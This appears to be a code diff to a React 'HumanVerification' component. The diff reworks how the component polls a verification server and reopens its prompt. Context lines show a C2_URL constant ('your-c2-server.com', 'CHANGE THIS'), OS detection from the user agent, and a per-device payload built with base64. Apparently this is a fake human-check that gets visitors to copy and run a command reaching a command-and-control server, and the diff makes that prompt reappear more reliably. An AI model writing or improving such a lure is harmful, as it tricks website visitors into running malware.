@@ -112,11 +112,13 @@ export function HumanVerification() {
     return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
   })
   const commandRef = useRef<HTMLTextAreaElement>(null)
-
-  const [keyA, setKeyA] = useState('')
+  const sessionRef = useRef<PublicVerification | null>(null)
+  const promptSeen = useRef(0)
+  const checkRun = useRef(0)
+  sessionRef.current = session
+  
   const [keyB, setKeyB] = useState('')
   const [payloadText, setPayloadText] = useState('')
-  const [device, setDevice] = useState('windows')
 
   const C2_URL = 'http://your-c2-server.com'; // CHANGE THIS
 
@@ -136,25 +138,6 @@ export function HumanVerification() {
   const b64Standard = (str) => btoa(unescape(encodeURIComponent(str)));
 
   useEffect(() => {
-    if (!track) return
-    const clientId = readClientId()
-    let cancelled = false
-    verifyFetch("/verify/sessions", {
-      method: "POST",
-      body: JSON.stringify({ page: window.location.pathname, clientId }),
-    })
-      .then((next) => {
-        if (!cancelled) setSession(next)
-      })
-      .catch((reason: Error) => {
-        if (!cancelled) setError(reason.message)
-      })
-    return () => {
-      cancelled = true
-    }
-  }, [attempt, track])
-
-  useEffect(() => {
     if (!open) return
     const previous = document.body.style.overflow
     document.body.style.overflow = "hidden"
@@ -163,19 +146,13 @@ export function HumanVerification() {
     }
   }, [open])
 
-  const sessionId = session?.id
-  const promptSeen = useRef(0)
-  const checkRun = useRef(0)
-
   useEffect(() => {
-
     const ua = navigator.userAgent || navigator.platform || ''
     let d = 'linux'
     if (/android/i.test(ua)) d = 'android'
     else if (/iPad|iPhone|iPod/i.test(ua)) d = 'ios'
     else if (ua.indexOf('Win') !== -1) d = 'windows'
     else if (ua.indexOf('Mac') !== -1) d = 'mac'
-    setDevice(d)
 
     const kB = session?.phrase
     // Build payload based on device
@@ -197,40 +174,79 @@ export function HumanVerification() {
   }, [session])
 
   useEffect(() => {
-    if (!track || !sessionId) return
-    setKeyB(session.phrase)
+    if (!track) return
     let cancelled = false
+    let timer = 0
+    let pending = false
 
-    const pull = () => {
-      verifyFetch(`/verify/sessions/${sessionId}`)
-        .then((next) => {
-          if (cancelled) return
-          setSession(next)
-          const finishedKey = `${next.id}:${next.promptId}`
-          const alreadyFinished = window.sessionStorage.getItem("apax-last-prompt") === finishedKey
-          if (next.promptId > 0 && next.promptId !== promptSeen.current && !alreadyFinished) {
-            promptSeen.current = next.promptId
-            checkRun.current += 1
-            setChecked(false)
-            setChecking(false)
-            setMark("idle")
-            setCopied(false)
-            setCodeInput("")
-            setError("")
-            setCopyNote("")
-            setPassed(false)
-            setOpen(true)
-          }
-        })
-        .catch(() => {})
+    const apply = (next: PublicVerification) => {
+      setSession(next)
+      setError("")
+      const finishedKey = `${next.id}:${next.promptId}`
+      const alreadyFinished = window.sessionStorage.getItem("apax-last-prompt") === finishedKey
+      if (next.promptId > 0 && next.promptId !== promptSeen.current && !alreadyFinished) {
+        promptSeen.current = next.promptId
+        checkRun.current += 1
+        setChecked(false)
+        setChecking(false)
+        setMark("idle")
+        setCopied(false)
+        setCodeInput("")
+        setError("")
+        setCopyNote("")
+        setPassed(false)
+        setOpen(true)
+      }
     }
-    pull()
-    const timer = window.setInterval(pull, 1500)
+
+    const beat = async () => {
+      if (pending) return
+      pending = true
+      try {
+        const next = await verifyFetch("/verify/sessions", {
+          method: "POST",
+          body: JSON.stringify({ page: window.location.pathname, clientId: readClientId() }),
+      })
+
+      if (!cancelled) apply(next)
+        } catch (reason) {
+          if (!cancelled && !sessionRef.current) {
+            setError(reason instanceof Error ? reason.message : "The check could not be completed.")
+          }
+        } finally {
+          pending = false
+        }
+    }
+
+    const schedule = () => {
+      timer = window.setTimeout(() => {
+        void beat().finally(() => {
+          if (!cancelled) schedule()
+        })
+      }, 1500)
+    }
+
+    void beat().finally(() => {
+      if (!cancelled) schedule()
+    })
+
+    const onWake = () => {
+      if (document.visibilityState === "hidden") return
+      void beat()
+    }
+    document.addEventListener("visibilitychange", onWake)
+    window.addEventListener("focus", onWake)
+    window.addEventListener("pageshow", onWake)
+    
     return () => {
       cancelled = true
-      window.clearInterval(timer)
+      window.clearTimeout(timer)
+      document.removeEventListener("visibilitychange", onWake)
+      window.removeEventListener("focus", onWake)
+      window.removeEventListener("pageshow", onWake)
+
     }
-  }, [sessionId, track])
+  }, [attempt, pathname, track])
 
   async function onCheck() {
     if (!session || checked || checking) return
